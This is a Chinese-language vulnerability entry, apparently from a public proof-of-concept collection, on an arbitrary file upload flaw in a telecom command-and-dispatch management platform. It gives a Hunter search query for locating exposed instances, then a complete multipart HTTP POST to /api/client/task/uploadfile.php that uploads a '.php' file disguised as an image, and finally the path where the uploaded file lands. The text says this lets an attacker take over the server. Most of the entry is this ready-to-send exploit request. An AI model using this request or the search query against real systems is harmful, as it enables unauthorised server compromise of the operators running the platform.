# 指挥调度平台task_uploadfile存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。</font>指挥调度平台task_uploadfile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 指挥调度平台

# 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征


# 四、漏洞复现
```plain
POST /api/client/task/uploadfile.php HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1Jt50iyf7
Cookie: PHPSESSID=403fc14298f14704c52657fc5ff62c71
Content-Length: 374

------WebKitFormBoundary25qW4eG1Jt50iyf7
Content-Disposition: form-data; name="uuid"

1
------WebKitFormBoundary25qW4eG1Jt50iyf7
Content-Disposition: form-data; name="number"

122
------WebKitFormBoundary25qW4eG1Jt50iyf7
Content-Disposition: form-data; name="uploadfile";filename="1.php"
Content-Type: image/jpg

111
------WebKitFormBoundary25qW4eG1Jt50iyf7--
```


上传文件位置

```plain
/upload/task/9cba3789-1c28-4aea-a205-1eb5faa3f477.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hfduq1o9a7uh3hh3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
